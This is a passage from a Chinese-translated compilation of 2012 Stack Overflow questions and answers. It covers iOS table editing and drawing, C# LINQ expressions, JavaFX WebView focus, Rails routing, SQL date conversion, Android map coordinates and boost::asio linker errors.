> 当发送`setEditing:animated`: 消息（第一个参数为 `YES`）时，表格视图进入编辑模式，其中显示每个可见行的编辑或重新排序控件，具体取决于 `editingStyle`每个关联的`UITableViewCell`. 单击插入或删除控件会导致数据源接收 `tableView:commitEditingStyle:forRowAtIndexPath`: 消息。`deleteRowsAtIndexPaths:withRowAnimation`您可以通过调用: 或 :来提交删除或插入 `insertRowsAtIndexPaths:withRowAnimation`，视情况而定。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:13:39.763

`self.navigationItem.leftBarButtonItem = self.editButtonItem;`在`viewDidLoad`方法中写这个 。之后实现这个方法`- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath`

```
- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath {

    if (editingStyle == UITableViewCellEditingStyleDelete) {

        [yourArray removeObjectAtIndex:indexPath.row];
        [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:YES];

    }
} 
```

# facebook - 作为开发人员如何将应用程序添加到 Facebook

> ID：10685376
> 
> 赞同：-2
> 
> 时间：2012-05-21T12:35:48.823
> 
> 标签：facebook

我想知道作为开发人员如何在 Facebook 中创建/添加应用程序？

我从 Facebook 开发人员那里尝试过，但是在单击创建新应用程序后，我已经给出了应用程序名称和命名空间，但它显示了一个弹出消息，提示您由于没有身份验证而无法创建应用程序。所以我不能向上移动。我不知道如何克服这个？

有没有办法将应用程序添加到 Facebook？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:38:30.257

您必须将您的 Facebook 帐户验证为开发者帐户。

你可以在这里阅读 - [https://www.facebook.com/help/?faq=167551763306531](https://www.facebook.com/help/?faq=167551763306531)

基本上有两种选择。您可以验证您的帐户

*   [通过手机](http://www.facebook.com/confirmphone.php)
*   通过在您的帐户详细信息中[添加信用卡。](https://secure.facebook.com/cards.php)

不用担心 - 他们不会从您的信用卡中收取费用 - 只是为了能够将应用程序追踪到“真实”的人，以便他们可以对违反 Facebook 服务条款的“不良”应用程序负责......

# c# - “为 lambda 声明提供的参数数量不正确”创建 Lambda 表达式

> ID：10685385
> 
> 赞同：2
> 
> 时间：2012-05-21T12:36:32.370
> 
> 标签：c#, entity-framework-4, lambda

我们创建了这个 LinqExtension 类来为 Linq 提供 Like 方法。包含对我们没有用，因为我们想做像“%a%b%”这样的搜索，在 StackOverFlow 中，我们发现了几篇使用 SqlFunction 类中的方法 PatIndex 来使用 Entity Framework 进行搜索的帖子。

为了保持干净的代码和易于重用，我们正在尝试做一个扩展方法来封装 PatIndex 调用

```
public static IQueryable<TSource> WhereLike<TSource>(
  this IQueryable<TSource> source,
  Expression<Func<TSource, string>> valueSelector,
  string value
)
{
  return source.Where(BuildLikeExpression(valueSelector, value));
}

public static Expression<Func<TElement, bool>> BuildLikeExpression<TElement>(
  Expression<Func<TElement, string>> valueSelector,
  string value
)
{
  if (valueSelector == null)
    throw new ArgumentNullException("valueSelector");

  var method = GetLikeMethod(value);

  var body = Expression.Call(method, valueSelector.Body, Expression.Constant(value));

  var parameter = valueSelector.Parameters.Single();
  var expressionConvert = Expression.Convert(Expression.Constant(0), typeof(int?));
  return Expression.Lambda<Func<TElement, bool>> (Expression.GreaterThan(body, expressionConvert));
}

private static MethodInfo GetLikeMethod(string value)
{
  var methodName = "PatIndex";
  Type stringType = typeof(SqlFunctions);
  return stringType.GetMethod(methodName);
} 
```

问题是当我们调用这个新方法时，我们得到错误**为 lambda 声明提供的参数数量不**正确

```
return Expression.Lambda<Func<TElement, bool>> (Expression.GreaterThan(body, expressionConvert)); 
```

我们缺少什么才能正确地做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T17:10:38.893

你快到了。

您的调用表达式的参数顺序错误，您需要将参数传递给`Expression.Lambda`：

```
public static Expression<Func<TElement, bool>> BuildLikeExpression<TElement>( Expression<Func<TElement, string>> valueSelector, string value )
{
    if ( valueSelector == null )
        throw new ArgumentNullException( "valueSelector" );

    var method = GetLikeMethod( value );

    var body = Expression.Call( method, Expression.Constant( value ), valueSelector.Body );

    var parameter = valueSelector.Parameters.Single();
    var expressionConvert = Expression.Convert( Expression.Constant( 0 ), typeof( int? ) );

    return Expression.Lambda<Func<TElement, bool>>( Expression.GreaterThan( body, expressionConvert ), parameter );
} 
```

# javascript - 无法将 iframe 从一个 div 复制到另一个 div？

> ID：10685390
> 
> 赞同：3
> 
> 时间：2012-05-21T12:36:37.067
> 
> 标签：javascript, jquery, asp.net

我正在尝试将 iframe 复制到另一个 div，它不起作用这是我的代码

```
<script type="text/javascript">
    $(document).ready(function () {
        setInterval(function () {
            if ($('#d1').html() != $('#d2').html()) {
                $('#d2').html($('#d1').html());
            }
        }, 4000);
    });
</script> 
```

和

```
<div id="d1">some stuff<iframe src="http://www.w3schools.com/html/default.asp" id="iframe1"></div>
<div id="d2"></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:43:25.643

您的 HTML 无效...一旦您修复它的工作原理，`<iframe>`应该使用...关闭`</iframe>`

[工作示例](http://jsfiddle.net/AmM6u/)

**注意：**做这种复制（即`$('div1').html($('div2').html()`）会导致`ids`文档中的重复——这又是无效的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:48:15.097

缺少 iframe 结束标记：

[在这里检查](http://jsfiddle.net/CQU3G/)

# webview - 具有 contenteditable 的 Webview 无法以编程方式聚焦

> ID：10685395
> 
> 赞同：2
> 
> 时间：2012-05-21T12:36:48.987
> 
> 标签：webview, javafx

在用户第一次单击控件之前，尝试在 WebView 上执行 requestFocus() 不起作用。

我知道这一定是可能的，因为 htmlEditor 可以以这种方式集中注意力（我怀疑它基于 contenteditable WebView）。

我正在使用带有“contenteditable”的 webview 编写我自己的专用 htmlEditor，我真的希望能够像使用标准 htmlEditor 一样聚焦它。

我相信这一定是 Javafx 的问题，我已经将它提交给了 Jira，但我想知道是否有人能想到一个解决方法。

**更新**：jira 中的问题编号：RT-21695

简短的演示代码：

```
/* Demo webview */

public class WebViewConteneditableDemo extends Application {

String initialEditview = "<html><head>"
        + "</head><body contenteditable='true'>"
        +"</body></html>";

/**
 * @param args the command line arguments
 */
public static void main(String[] args) {
    launch(args);
}

@Override
public void start(Stage primaryStage) {
    primaryStage.setTitle("Webview focus demo");

    final WebView editor = new WebView();

    Button btn = new Button();
    btn.setText("Test Webview focus");
    btn.setOnAction(new EventHandler<ActionEvent>() {

        @Override
        public void handle(ActionEvent event) {
           editor.requestFocus();
        }
    });

    BorderPane root = new BorderPane();
    root.setTop(btn);

    root.setCenter(editor);
    editor.getEngine().loadContent(initialEditview);

    primaryStage.setScene(new Scene(root, 500, 450));
    primaryStage.show();
} 
```

}

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T16:44:00.493

[requestFocus](http://docs.oracle.com/javafx/2/api/javafx/scene/Node.html#requestFocus%28%29) api 只是一个焦点请求，它不保证焦点。

有时，其他 JavaFX 控件的内部实现在您请求焦点之前或之后请求焦点，最终在您的 requestFocus 调用中没有任何效果。

[通常，您可以通过将 requestFocus 调用包装在Platform.runLater](http://docs.oracle.com/javafx/2/api/javafx/application/Platform.html#runLater%28java.lang.Runnable%29)中或使用带有[KeyFrame的](http://docs.oracle.com/javafx/2/api/javafx/animation/KeyFrame.html)[Timeline](http://docs.oracle.com/javafx/2/api/javafx/animation/Timeline.html)来使 requestFocus 调用生效，该 KeyFrame在延迟后调用 requestFocus。

如果这些都不起作用，那么 JavaFX 团队可以在您提交的 jira 上下文中解决 WebView 的 requestFocus 处理中可能存在错误。

**更新**

问题中的示例代码中的具体问题是，虽然 WebView 获得了焦点，但 WebView 中的可编辑内容元素没有获得焦点。

我尝试仅将示例代码中的 html 加载`<html><head></head><body contenteditable='true'></body></html>`到 firefox 中，它的行为与 JavaFX WebView 完全相同（即，可编辑的内容元素在被点击之前没有被聚焦）。所以我不认为这是 WebView 的问题。

要获得可编辑元素的焦点，您需要在希望它集中时执行一些脚本，例如在 javascript onload 钩子中`<body onLoad='document.body.focus();' contenteditable='true'/>`

这是一个可执行的示例应用程序，它演示了对 JavaFX WebView 中 contenteditable 元素的焦点行为的编程控制：

```
import javafx.application.Application;
import javafx.beans.binding.Bindings;
import javafx.event.*;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.*;
import javafx.scene.web.WebView;
import javafx.stage.Stage;

public class WebViewEditable extends Application {
  String content = "<body bgcolor='cornsilk' onLoad='document.body.focus();' contenteditable='true'/>";
  public static void main(String[] args) { launch(args); }
  @Override public void start(Stage stage) {
    final WebView editor = new WebView();
    editor.getEngine().loadContent(content);

    Button webviewFocusButton = new Button("Focus on WebView");
    webviewFocusButton.setOnAction(new EventHandler<ActionEvent>() {
      @Override public void handle(ActionEvent event) {
        editor.getEngine().executeScript("document.body.focus()");
        editor.requestFocus();
      }
    });
    Button selfFocusButton = new Button("Focus on this Button");

    Label focusLabel = new Label();
    focusLabel.textProperty().bind(Bindings
      .when(editor.focusedProperty())
        .then("WebView has the focus.")
        .otherwise("WebView does not have the focus.")
    );
    focusLabel.setMaxWidth(Double.MAX_VALUE);
    focusLabel.setStyle("-fx-background-color: coral; -fx-padding: 5;");

    BorderPane layout = new BorderPane();
    layout.setTop(HBoxBuilder.create().spacing(10).children(webviewFocusButton, selfFocusButton).style("-fx-padding: 10; -fx-background-color: palegreen").build());
    layout.setCenter(editor);
    layout.setBottom(focusLabel);
    stage.setScene(new Scene(layout));
    stage.show();
  }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-07-21T22:20:01.833

您可以通过这种方式聚焦 HTMLEditor 的 webview：

```
import com.sun.javafx.scene.web.skin.HTMLEditorSkin;

import javafx.application.Application;
import javafx.application.Platform;
import javafx.scene.Scene;
import javafx.scene.input.MouseButton;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.GridPane;
import javafx.scene.web.HTMLEditor;
import javafx.scene.web.WebView;
import javafx.stage.Stage;

public class FocusTest extends Application {

    public static void main(final String[] args) {
        launch(args);
    }

    @Override
    public void start(Stage primaryStage) throws Exception {
        final HTMLEditor editor = new HTMLEditor();
        final WebView editorView = (WebView) editor.lookup(".web-view");

        primaryStage.setScene(new Scene(editor));
        primaryStage.sizeToScene();
        primaryStage.show();

        Platform.runLater(() -> {
            view.fireEvent(new MouseEvent(MouseEvent.MOUSE_PRESSED, 100, 100, 200, 200, MouseButton.PRIMARY, 1, false, false, false, false, false, false, false, false, false, false, null));
            editor.requestFocus();
            view.fireEvent(new MouseEvent(MouseEvent.MOUSE_RELEASED, 100, 100, 200, 200, MouseButton.PRIMARY, 1, false, false, false, false, false, false, false, false, false, false, null));
        });
    }

} 
```

# sql - 如何获得正确的日期格式

> ID：10685396
> 
> 赞同：-1
> 
> 时间：2012-05-21T12:36:49.290
> 
> 标签：sql, sql-server, sql-server-2000

表格1

```
Date1 (datatype is integer)

25969 
25969
.... 
```

我想获得正确的日期格式，例如 (18-05-2012)

上面的 date1 列值输出是

```
Date1

17-05-2012
17-05-2012
... 
```

如何对此进行查询。

需要查询帮助

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-21T12:41:20.760

假设您`int`是 UNIXTIME（自 1970/01/01 以来的秒数）

就像是：

```
declare @UNIX_TIME int
select @UNIX_TIME = 1111111111
-- Using dateadd to add seconds to 1970-01-01
select [Datetime from UNIX Time] = dateadd(ss,@UNIX_TIME,'1970-01-01') 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-21T13:01:21.737

这将起作用：

```
select convert(varchar(50), cast(Date1 as datetime), 105) 
from table 
```

# ruby-on-rails - rails - 如何使用参数发出 GET 请求以执行操作

> ID：10685401
> 
> 赞同：0
> 
> 时间：2012-05-21T12:36:58.783
> 
> 标签：ruby-on-rails, ruby, routing, get

我希望这个问题是一个相当简单的问题，因为我对 Rails 开发比较陌生。我正在尝试从具有指定操作的控制器发出获取请求并传递所需的参数。这是助手类中的相关代码：

```
module ChartsHelper
  def chart_tag (action, height, params = {})
    params[:format] ||= :json
    path = charts_path(action, params)
    content_tag(:div, :'data-chart' => path, :style => "height: #{height}px;") do
      image_tag('loading.gif', :size => '32x32', :class => 'spinner')
  end
 end
end 
```

以及 ChartsController 中的相应操作：

```
class ChartsController < ApplicationController

  def week_events_bar_chart
    days = (params[:days] || 30).to_i
    render :json => {
      :type => 'AreaChart',
      :cols => [['string', 'Date'], ['number', 'subscriptions']],
      :rows => (1..days).to_a.inject([]) do |memo, i|
        date = i.days.ago.to_date
        t0, t1 = date.beginning_of_day, date.end_of_day
        subscriptions = Kpsevent.all.count
        memo << [date, subscriptions]
        memo
      end.reverse,
      :options => {
        :chartArea => { :width => '90%', :height => '75%' },
        :hAxis => { :showTextEvery => 30 },
        :legend => 'bottom',
      }
    }
  end
end 
```

路由文件有以下内容：

```
resource :charts do
    get 'week_events_bar_chart'
end 
```

但是，在尝试执行此请求时，我得到以下输出：

```
 Started GET "/charts.week_events_bar_chart?days=14" for 127.0.0.1 at Tue May 22 00:31:48 +1200 2012
   Processing by ChartsController#index as 
   Parameters: {"days"=>"14"} 
```

并且永远不会调用控制器操作。有人能帮助解决这个问题吗？

编辑：耙路线输出：

```
week_events_bar_chart_charts GET    /charts/week_events_bar_chart(.:format) {:controller=>"charts", :action=>"week_events_bar_chart"}
POST   /charts(.:format)                  {:controller=>"charts", :action=>"create"}
new_charts GET    /charts/new(.:format)    {:controller=>"charts", :action=>"new"}
edit_charts GET    /charts/edit(.:format)  {:controller=>"charts", :action=>"edit"}
GET    /charts(.:format)                   {:controller=>"charts", :action=>"show"}
PUT    /charts(.:format)                   {:controller=>"charts", :action=>"update"}
DELETE /charts(.:format)                   {:controller=>"charts", :action=>"destroy"} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:46:59.910

对于您对控制台的评论：

在 rails 中`chart_path(x,...)`会生成一个到`ChartsController#show`param id = x 的路由，默认情况下是`GET /charts/x`. 通过将参数命名为“action”，您自欺欺人了，“week_events_bar_chart”将只是 restful 路线中的 id。

到您的原始代码： `charts_path(x, params)`将`ChartsController#index`使用格式 x 路由到，看起来像`GET /charts.week_events_bar_chart`，再次称它为动作愚弄了您。

您需要的是`week_events_bar_chart_charts_path`为您的操作命名的路由助手。

但是由于您似乎希望您的辅助操作依赖，我推荐 url_for。 [http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-url_for](http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-url_for)

```
module ChartsHelper
  def chart_tag(action, height, params = {})
    params[:format] ||= :json
    url = url_for({:action => action, :controller => 'charts'}.merge(params))
    content_tag(:div, :'data-chart' => url, :style => "height: #{height}px;") do
      image_tag('loading.gif', :size => '32x32', :class => 'spinner')
  end
 end 
```

结尾

如果您真的想要完整路径，请传递`:only_path => false`给 url_for。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:46:13.613

您是否尝试过使用斜线而不是句号来访问路线`charts`？

IE

```
/charts/week_events_bar_chart?days=14 
```

而不是

```
/charts.week_events_bar_chart?days=14 
```

# asp.net - 引用来自不同 Web 项目的 aspx 页面

> ID：10685402
> 
> 赞同：0
> 
> 时间：2012-05-21T12:37:06.803
> 
> 标签：asp.net, multiple-projects

我有一个包含多个 Web 项目的 ASP .NET Web 表单解决方案。有一个核心 Web 项目，其他每个 Web 项目都作为可插拔模块工作。

我编写了一个构建后事件，将子 Web 项目的 aspx/ascx 文件和 *.dll 复制到核心 Web 项目目录。

问题是 - 我无法从核心项目中调用子项目 aspx 页面。我收到“无法加载类型”错误。

如果我引用该 webproject dll 并将 aspx 文件复制到主应用程序，是否可以在不同的项目中使用 aspx 页面？我在这里做错了什么。我将不胜感激任何指向正确方向的指针。谢谢你。

桑杰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-24T05:02:10.323

我找到了答案。关键是在 web.config 文件中定义你的程序集，然后定义一个探测路径。以下是详细信息的链接- [http://weblogs.asp.net/chrismoseley/archive/2008/10/28/shared-assemblies-without-the-gac.aspx](http://weblogs.asp.net/chrismoseley/archive/2008/10/28/shared-assemblies-without-the-gac.aspx)

# android - 如何将 GeoPoint 转换为硬件屏幕点

> ID：10685408
> 
> 赞同：6
> 
> 时间：2012-05-21T12:37:15.773
> 
> 标签：android, android-mapview

我想将 GeoPoint 转换为屏幕点，以识别触摸事件上方的所有对象。所以，我试过这个：

```
Projection projection = this.mapView.getProjection(); 
GeoPoint gie = new GeoPoint(lat, lon);
Point po = new Point();
projection.toPixels(gie, po); 
```

但是，po.x 和 po.y 不是屏幕坐标，而是 mapview 以像素而不是 lat,lon 为单位的坐标。

来自安卓开发者网站：

> toPixels(GeoPoint in, android.graphics.Point out) 将给定的 GeoPoint 转换为屏幕像素坐标，相对于提供此 Projection 的 MapView 的左上角。

那么，是否可以将其转换为正确的屏幕坐标？

我想知道**+**触摸事件旁边的所有**x GeoPoint，如上例所示：**

 **```
----------------------------------------------------------------
(0,0) -----------> x                                           |
  |                                                            |
  |                                                            | 
  |                                                            |  <-- My screen
  |                              + (touch event)               |
 \/                            x (my GeoPoint)                 |
  y                                                            |
                                                               | 
---------------------------------------------------------------- 
```

我得到这样的触摸事件：

```
@Override
public boolean onTouchEvent(MotionEvent event) {
    float x = event.getX();
    float y = event.getY(); 
```

在这里，在这段代码中，x 和 y 是真正的屏幕坐标（硬件坐标，而不是地图视图坐标）

我知道我也可以在 GeoPoint 中转换 x,y 屏幕坐标以将它们与我的 GeoPoint 进行比较，但是，由于缩放级别，我无法得到我想要的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T14:49:43.010

我不知道您为什么要使用 onTouchEvent，它是针对未由视图处理的事件。如果您使用 onTouch(View v0, MotionEvent e)，这将为您提供与视图相关的信息，您可以使用视图的 getLeft 和 getBottom 方法计算屏幕坐标。如果您使用占据屏幕右下角的地图视图创建项目，例如：

主要的.xml

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >
    <com.google.android.maps.MapView
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/map"
        android:layout_width="220dp"
        android:layout_height="220dp"
        android:layout_alignParentBottom="true"
        android:layout_alignParentRight="true"
        android:apiKey="Your API key"
        android:clickable="true" />
</RelativeLayout> 
```

然后运行这段代码

```
public class GoogleMapsTouchActivity extends MapActivity implements OnTouchListener {

    private MapController mMapCtrlr;
    private MapView mMapVw;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }
    @Override
    protected void onResume() {
        super.onResume();
        mMapVw = (MapView) findViewById(R.id.map);
        mMapVw.setReticleDrawMode(MapView.ReticleDrawMode.DRAW_RETICLE_OVER);
        mMapCtrlr = mMapVw.getController();
        mMapCtrlr.setZoom(15);
        mMapCtrlr.setCenter(new GeoPoint(53500000, -3000000));
        mMapVw.setOnTouchListener(this);
    }

    @Override
    public boolean onTouch(View v0, MotionEvent e) {
        // Only fires if Mapview touched
        float x = e.getX(); // relative to VIEW
        float y = e.getY(); // relative to VIEW
        float x2; // relative to SCREEN
        float y2; // relative to SCREEN
        if (e.getAction() == MotionEvent.ACTION_DOWN) {
            Toast.makeText(this, "View x = " + x + " View y = " + y, Toast.LENGTH_SHORT).show();
            x2 = mMapVw.getLeft() + x;
            y2 = mMapVw.getBottom() + y;
            Toast.makeText(this, "Screen x = " + x2 + " Screen y = " + y2, Toast.LENGTH_SHORT).show();
            GeoPoint gPt = mMapVw.getProjection().fromPixels((int) x,   (int)y);
            Toast.makeText(this, "Lat = " + gPt.getLatitudeE6() + " Lon = " + gPt.getLongitudeE6(), Toast.LENGTH_SHORT).show();

        }
        return false;
    }
    @Override
    public boolean onTouchEvent(MotionEvent e) {
        // Only fires if screen touched outside a view
        float x = e.getX();
        float y = e.getY();
        if (e.getAction() == MotionEvent.ACTION_DOWN) {
            Toast.makeText(this, "Got touch EVENT x = " + x + " y = " + y, Toast.LENGTH_SHORT).show();
        }
        return super.onTouchEvent(e);
    }
    @Override
    protected boolean isRouteDisplayed() {return false;}
} 
```

如果您单击视图和地图视图之外的区域，则 Toast 消息应该会让您一目了然。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-22T09:08:33.513

我找到了一个解决方案，我不知道这是否是获得它的最佳方法，但它有效！

感谢您的帮助@nickt，我找到了***getScreenRect()***方法，它以屏幕坐标返回屏幕的当前边界。

这里的代码：

```
float pisteX;
float pisteY;
Projection projection = this.mapView.getProjection(); 
Point pt = new Point();
GeoPoint gie = new GeoPoint(latitude,longitude);
Rect rec = mapView.getScreenRect(new Rect());
projection.toPixels(gie, pt);
pisteX = pt.x-rec.left; // car X screen coord
pisteY = pt.y-rec.top; // car Y screen coord 
```**

# iphone - 在uiview上绘制随机设计

> ID：10685411
> 
> 赞同：1
> 
> 时间：2012-05-21T12:37:25.343
> 
> 标签：iphone, facebook

我想在 uiview 上绘制一个随机设计，就像我们在画笔上绘制我想要用户在屏幕上触摸开始绘制的位置一样。就像他想在里面写好而不是画出来。如果他想做鸭子或球，那么他就可以做到。请帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-24T10:00:18.383

你将不得不让你的 UIView 成为上述的子类。在您的控制器 class.m 文件中，您必须添加并调用这两个方法。我希望这行得通。

-（IBAction）清除{

```
[self.view cancelDrawing]; 
```

}

-(IBAction)saveDrawing {

```
UIGraphicsBeginImageContext(self.view.bounds.size);

[self.view.layer renderInContext:UIGraphicsGetCurrentContext()];

UIImage *finishedPic = UIGraphicsGetImageFromCurrentImageContext();

UIGraphicsEndImageContext();

UIImageWriteToSavedPhotosAlbum(finishedPic, self, @selector(exitProg:didFinishSavingWithError:contextInfo:), nil); 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-22T04:33:58.163

尝试这个。在此，您将不得不`self.view.frame`在我拥有的任何地方使用`myPic.Frame`。

在头文件中：

```
#import <Foundation/Foundation.h>

@interface DrawView : UIView {

    UIImage *myPic;

    NSMutableArray *myDrawing;

}

-(void)drawPic:(UIImage *)thisPic;

-(void)cancelDrawing;

@end 
```

并在实施文件中：

```
#import "DrawView.h"

@implementation DrawView

-(void)drawPic:(UIImage *)thisPic {

    myPic = thisPic;

    [myPic retain];

    [self setNeedsDisplay];

}

- (void)drawRect:(CGRect)rect {

    float newHeight;

    float newWidth;

    if (!myDrawing) {

        myDrawing = [[NSMutableArray alloc] initWithCapacity:0];

    }

    CGContextRef ctx = UIGraphicsGetCurrentContext();

    if (myPic != NULL) {

        float ratio = myPic.size.height/460;

        if (myPic.size.width/320 > ratio) {

            ratio = myPic.size.width/320;

        }

        newHeight = myPic.size.height/ratio;

        newWidth = myPic.size.width/ratio;

        [myPic drawInRect:CGRectMake(0,0,newWidth,newHeight)];

    }

    if ([myDrawing count] > 0) {

        CGContextSetLineWidth(ctx, 5);

        for (int i = 0 ; i < [myDrawing count] ; i++) {

            NSArray *thisArray = [myDrawing objectAtIndex:i];

            if ([thisArray count] > 2) {

                float thisX = [[thisArray objectAtIndex:0] floatValue];

                float thisY = [[thisArray objectAtIndex:1] floatValue];

                CGContextBeginPath(ctx);

                CGContextMoveToPoint(ctx, thisX, thisY);

                for (int j = 2; j < [thisArray count] ; j+=2) {

                    thisX = [[thisArray objectAtIndex:j] floatValue];

                    thisY = [[thisArray objectAtIndex:j+1] floatValue];

                    CGContextAddLineToPoint(ctx, thisX,thisY);

                }

                CGContextStrokePath(ctx);

            }

        }

    }

}

- (void) touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {

    [myDrawing addObject:[[NSMutableArray alloc] initWithCapacity:4]];

    CGPoint curPoint = [[touches anyObject] locationInView:self];

    [[myDrawing lastObject] addObject:[NSNumber numberWithFloat:curPoint.x]];

    [[myDrawing lastObject] addObject:[NSNumber numberWithFloat:curPoint.y]];

}

- (void) touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event {

    CGPoint curPoint = [[touches anyObject] locationInView:self];

    [[myDrawing lastObject] addObject:[NSNumber numberWithFloat:curPoint.x]];

    [[myDrawing lastObject] addObject:[NSNumber numberWithFloat:curPoint.y]];

    [self setNeedsDisplay];

}

- (void) touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event {

    CGPoint curPoint = [[touches anyObject] locationInView:self];

    [[myDrawing lastObject] addObject:[NSNumber numberWithFloat:curPoint.x]];

    [[myDrawing lastObject] addObject:[NSNumber numberWithFloat:curPoint.y]];

    [self setNeedsDisplay];

}

-(void)cancelDrawing {

    [myDrawing removeAllObjects];

    [self setNeedsDisplay];

}

- (void)dealloc {

    [super dealloc];

    [myPic release];

    [myDrawing release];

}

@end 
```

# java - 无法在 J2ME 字符串中插入制表符空格 ("\t")

> ID：10685413
> 
> 赞同：1
> 
> 时间：2012-05-21T12:37:33.883
> 
> 标签：java, java-me, midp, lcdui

我有一个字符串

```
str = "Hello\tWorld"; 
```

当我在 J2ME 应用程序中打印字符串时，结果是：

`"HelloWorld"`代替`"Hello<tab space>World"`

运行以下示例代码时，文本字段不显示制表符空间，而仅显示“HelloWorld”而没有制表符空间。

示例代码：

```
public class MyApp extends MIDlet {

    private Display display;
    private Form frmMain;

    public MyApp() {
        display = Display.getDisplay(this);
        frmMain = new Form("Hello");
    }

    protected void startApp() throws MIDletStateChangeException {
        TextField txt = new TextField("Text", "", 200, TextField.ANY);
        txt.setString("Hello\tWorld");
        frmMain.append(txt);

        display.setCurrent(frmMain);
    }

    protected void pauseApp() {
    }

    protected void destroyApp(boolean unconditional) throws MIDletStateChangeException {
        destroyApp(unconditional);
        notifyDestroyed();
    }
} 
```

# c++ - 如何使用带有 boost::asio 的预编译头文件

> ID：10685416
> 
> 赞同：3
> 
> 时间：2012-05-21T12:37:51.320
> 
> 标签：c++, visual-c++, linker, boost-asio, compilation-time

我有一个项目有一些`main.cpp`和以下预编译头：

```
 <!-- language: lang-cpp -->
 #ifndef PRECOMPILE_H
 #define PRECOMPILE_H
 #include <iostream>
 #include <string>
 #include <vector>
 #include <boost\asio.hpp>
 #include <boost\bind.hpp>
 #include <boost\asio\ssl.hpp>
 #include <boost\locale.hpp>
 #include <boost\algorithm\string.hpp>
 #endif 
```

如果项目是`*.lib`，它总是正常构建。

如果项目是`*.exe`：
当使用 构建时`Create (/Yc)`，一切正常。
设置时`Use (/Yu)` **出现链接器错误** `LNK2001`：

> 1) 未解析的外部符号“私有：静态类 boost::asio::detail::tss_ptr::context> boost::asio::detail::call_stack::top_” (?top_@?$call_stack@Vstrand_impl@strand_service@ detail@asio@boost@@E@detail@asio@boost@@0V?$tss_ptr@Vcontext@?$call_stack@Vstrand_impl@strand_service@detail@asio@boost@@E@detail@asio@boost@@@234@一种）
> 
> 2) 未解析的外部符号“public: static class boost::asio::detail::service_id boost::asio::detail::service_base::id”(?id@?$service_base@Vselect_reactor@detail@asio@boost@ @@detail@asio@boost@@2V?$service_id@Vselect_reactor@detail@asio@boost@@@234@A)
> 
> 3) 未解析的外部符号“public: static class boost::asio::detail::service_id boost::asio::detail::service_base::id”(?id@?$service_base@Vstrand_service@detail@asio@boost@ @@detail@asio@boost@@2V?$service_id@Vstrand_service@detail@asio@boost@@@234@A)
> 
> 4) 未解析的外部符号“public: static class boost::asio::detail::service_id >> boost::asio::detail::service_base >>::id” (?id@?$service_base@V?$deadline_timer_service @Vptime@posix_time@boost@@U?$time_traits@Vptime@posix_time@boost@@@asio@3@@asio@boost@@@detail@asio@boost@@2V?$service_id@V?$deadline_timer_service@Vptime @posix_time@boost@@U?$time_traits@Vptime@posix_time@boost@@@asio@3@@asio@boost@@@234@A)

提升：v1_49 静态/MTd

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-22T10:50:33.120

如果您的预编译头文件被调用`PCH.H`，您还应该有一个`PCH.CPP`文件被编译`/Yc`并链接（as `PCH.OBJ`）到您编译的所有其他文件`/Yu`。

对于其他可行的情况，这可能是因为`static`Boost 标头中的任何内容都必须从预编译的标头对象文件中导出。

# iphone - iPhone iOS 如何在原地翻转/反射任何 UIView？

> ID：10685422
> 
> 赞同：8
> 
> 时间：2012-05-21T12:38:11.997
> 
> 标签：iphone, objective-c, ios, uiview, core-graphics

我知道如何通过在其范围内重新绘制 UIImage 来翻转/反射/旋转它。

```
- (IBAction)reflectImageView:(UIImageView)imageView {

    UIGraphicsBeginImageContextWithOptions(imageView.bounds.size, NO, 0.0);
    CGContextRef context = UIGraphicsGetCurrentContext();
    CGContextScaleCTM(context, 1.0, -1.0);
    CGContextTranslateCTM(context, 0.0, -imageView.bounds.size.height);

   [imageView.layer renderInContext:context];
    imageView.image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

} 
```

但是如何为任何 UIView 创建“翻转/反射”效果，最好将其中心保持在与以前相同的位置？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T12:42:18.727

```
 [UIView beginAnimations:nil context:nil];
    [UIView setAnimationDuration:0.75];
    [UIView setAnimationDelegate:self];
    [UIView setAnimationTransition:UIViewAnimationTransitionFlipFromRight forView:self.activeView cache:YES];
    //        [self.activeView removeFromSuperview];
    [UIView commitAnimations];

    NSNumber* isReflected = [self.activeView.attributedView.attributes valueForKey:kIsReflected];
    if(isReflected.boolValue)
    {
        self.activeView.transform = CGAffineTransformMakeScale(1,1);
